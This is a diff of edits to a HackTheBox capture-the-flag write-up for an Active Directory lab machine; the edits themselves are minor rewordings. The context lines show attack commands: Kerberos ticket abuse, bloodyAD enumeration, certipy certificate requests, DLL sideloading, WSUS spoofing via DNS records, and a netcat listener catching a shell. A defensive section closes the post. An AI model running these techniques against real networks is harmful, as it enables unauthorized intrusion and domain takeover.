@@ -26,11 +26,11 @@ logo: /assets/img/writeups/logging/logging.png
 
 ## Overview
 
-I found this machine fairly tricky for a Medium-level box. The difficulty came from the fact that several of the tools were new to me, and I had to pay close attention to the payload code so that it was actually suitable for DLL sideloading. The upside is that I learned a lot from it.
+I found this machine fairly tricky for a Medium-level box, mainly because several of the tools were new to me, and I had to pay close attention to the payload code so that it was actually suitable for DLL sideloading. The upside is that I learned a lot from it.
 
 ## Reconnaissance
 
-Before we spawn the machine we are shown the following information.
+Before spawning the machine, HTB shows this:
 
 #### Machine Information
 
@@ -157,7 +157,7 @@ Win32 Error: 49 (Invalid Credentials)
 <SNIP - remaining heartbeat / trace noise omitted>
 ```
 
-Something below catches my eye. In the logs you can see an attempt to log in with the user `svc_recovery`, but it fails because of a wrong password. Let's verify this with nxc.
+One line in the log catches my eye. In the logs you can see an attempt to log in with the user `svc_recovery`, but it fails because of a wrong password. Let's verify this with nxc.
 
 
 ```bash
@@ -166,7 +166,7 @@ SMB  10.129.45.103  445  DC01  [*] Windows 10 / Server 2019 Build 17763 x64 (nam
 SMB  10.129.45.103  445  DC01  [-] logging\svc_recovery:<REDACTED> STATUS_ACCOUNT_RESTRICTION
 ```
 
-`STATUS_ACCOUNT_RESTRICTION`. Now what? SMB logon is being blocked. If the password were wrong you'd get a different error — `STATUS_LOGON_FAILURE` — as shown below. To contrast: if we try our start account `wallace.everette` with the wrong year in its password (here `2025` instead of `2026`), we get exactly that `STATUS_LOGON_FAILURE`.
+`STATUS_ACCOUNT_RESTRICTION`. Now what? SMB logon is being blocked. If the password were wrong you'd get a different error — `STATUS_LOGON_FAILURE` — as shown below. By contrast: if we try our start account `wallace.everette` with the wrong year in its password (here `2025` instead of `2026`), we get exactly that `STATUS_LOGON_FAILURE`.
 
 ```bash
 nxc smb dc01.logging.htb -u wallace.everette -d logging.htb --dns-server 10.129.45.103 -p 'Welcome2025@'
@@ -176,7 +176,7 @@ SMB  10.129.45.103  445  DC01  [-] logging.htb\wallace.everette:Welcome2025@ STA
 
 #### Kerberos
 
-nxc doesn't play nicely with ldaps, but there are multiple ways to Rome. Let's see if we can obtain a Kerberos ticket.
+nxc doesn't play nicely with ldaps, but there's more than one way to Rome. Let's see if we can obtain a Kerberos ticket.
 
 The leaked log shows `svc_recovery`'s password is `<REDACTED>` (note: the value in the log uses the year **2025** and the bind fails). That's our first clue about how this organisation handles passwords.
 
@@ -222,7 +222,7 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 [*] Saving ticket in svc_recovery.ccache
 ```
 
-Got a ticket. Set the `KRB5CCNAME` variable we need for authorization.
+Got a ticket. Set the `KRB5CCNAME` variable we need for authentication.
 
 ```bash
 export KRB5CCNAME=svc_recovery.ccache
@@ -264,7 +264,7 @@ I always look at who can log in remotely — who is a member of Remote Managemen
 
 ![BloodHound - MSA_HEALTH$ is a member of Remote Management Users](/assets/img/writeups/logging/bloodhound_msa_health.png)
 
-Because BloodHound doesn't always show everything, it's also useful to use multiple tools. We can use bloodyAD to see which AD objects we have write access to.
+Because BloodHound doesn't always show everything, it pays to run more than one tool. We can use bloodyAD to see which AD objects we have write access to.
 
 ```bash
 bloodyAD -k ccache='svc_recovery.ccache' -d logging.htb --dc-ip 10.129.45.103 --host dc01.logging.htb get writable
@@ -338,7 +338,7 @@ Certipy v5.0.4 - by Oliver Lyak (ly4k)
 evil-winrm-py -u 'msa_health$' -H <REDACTED> -i dc01.logging.htb
 ```
 
-Among other things, on the root we notice the `Share` and `Wsus` directories.
+Among other things, in the root of C: we notice the `Share` and `Wsus` directories.
 
 ```powershell
 Directory: C:\
@@ -357,7 +357,7 @@ d-----        4/16/2026   5:29 PM                Wsus
 
 ## DLL sideloading
 
-After investigation, something interesting shows up in the file below.
+While poking around I found this in a log:
 
 ```windows
 type C:\ProgramData\UpdateMonitor\Logs\monitor.log
@@ -375,7 +375,7 @@ type C:\ProgramData\UpdateMonitor\Logs\monitor.log
 [2026-08-05 21:26:15] Update check completed.
 ```
 
-Interesting here is that the file `settings_update.dll` does not exist. The owner of the log file is `jaylee.clifton`.
+The interesting part: `settings_update.dll` doesn't exist. The owner of the log file is `jaylee.clifton`.
 
 ```text
 get-acl C:\ProgramData\UpdateMonitor\Logs\monitor.log | fl
@@ -493,7 +493,7 @@ Uploading /home/henk/htb/logging/Settings_Update.zip: 100%|███████
 [+] File uploaded successfully as: C:\Users\msa_health$\Documents\Settings_Update.zip
 ```
 
-We need to adjust the ACL of the file so that everyone may execute it.
+We need to adjust the ACL of the file so that everyone can read it.
 
 ```powershell
 $acl = get-acl .\Settings_Update.zip
@@ -739,7 +739,7 @@ v2.3.3
 <REDACTED>
 ```
 
-For some reason I can't write the ticket to a file. No problem — I copy the output to the clipboard and paste it into the console after: `echo -n`
+For some reason I can't write the ticket to a file. No problem — I copy the output from the browser and paste it after `echo -n`, like this:
 
 ```bash
 echo -n <REDACTED> | base64 -d > ticket.kirbi
@@ -782,7 +782,7 @@ HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU
 UseWUServer    REG_DWORD    0x1
 ```
 
-**Step 2** is finding the vulnerable template, which we already know from LockSmith: it is `UpdateSrv`, and we also know the CA name.
+**Step 2** is finding the vulnerable template: we already know from Locksmith that it is `UpdateSrv`, and we also know the CA name.
 
 So we go to **Step 3**.
 
@@ -794,7 +794,7 @@ certipy-ad req -u jaylee.clifton -k -no-pass -ca logging-DC01-CA -target dc01.lo
 openssl pkcs12 -in wsus.pfx -out wsus.pem -nodes --passin pass:
 ```
 
-**Step 4**: Intercept the wsus traffic. The user `jaylee.clifton` may create a record in `MicrosoftDNS`.
+**Step 4**: Intercept the wsus traffic. The user `jaylee.clifton` can create a record in `MicrosoftDNS`.
 
 ```bash
 bloodyAD -k ccache='ticket.ccache' -d logging.htb --dc-ip 10.129.45.103 --host dc01.logging.htb get writable
@@ -865,7 +865,7 @@ Listening on 0.0.0.0 9911
 Connection received on 10.129.45.103 56917
 ```
 
-Where is the root.txt, am I missing something...
+Where is root.txt? Am I missing something?
 
 ```powershell
 PS C:\Users\Administrator\Desktop> whoami
@@ -881,7 +881,7 @@ Mode                LastWriteTime         Length Name
 
 ![BloodHound - TOBY.BRYNLEIGH is a member of Domain Admins](/assets/img/writeups/logging/bloodhound_toby.png)
 
-Toby is also a domain admin. It is of course bad practice to log in with the builtin administrator account.
+Toby is also a domain admin. It is of course bad practice to log in with the built-in administrator account.
 
 ```powershell
 PS C:\Users\toby.brynleigh\Desktop> dir
@@ -895,8 +895,8 @@ Mode                LastWriteTime         Length Name
 
 ## Defensive perspective
 
-From a defensive perspective, I would use logs and monitoring to check where servers are trying to connect. If these are non-existent servers, there is a chance they are being spoofed. Users should always be granted rights according to least privilege — not just able to create or spoof DNS records. Furthermore, incrementing passwords is bad practice. Log files reveal a lot too; they are useful for debugging and monitoring, but attackers find them handy as well.
+From a defensive perspective, I would use logs and monitoring to check where servers are trying to connect. If these are non-existent servers, there is a chance they are being spoofed. Users should get rights according to least privilege; creating DNS records is not something everyone needs. Incrementing the year in passwords is bad practice too. Log files reveal a lot too; they are useful for debugging and monitoring, but attackers find them handy as well.
 
 ## Takeaways
 
-It is important to always stay up to date and not rely solely on known "outdated" tools. New vulnerabilities and new exploitation techniques appear every day. Keep your environment up to date.
+Don't assume the tools you already know still work. New vulnerabilities and new exploitation techniques appear every day, so keep the environment patched.
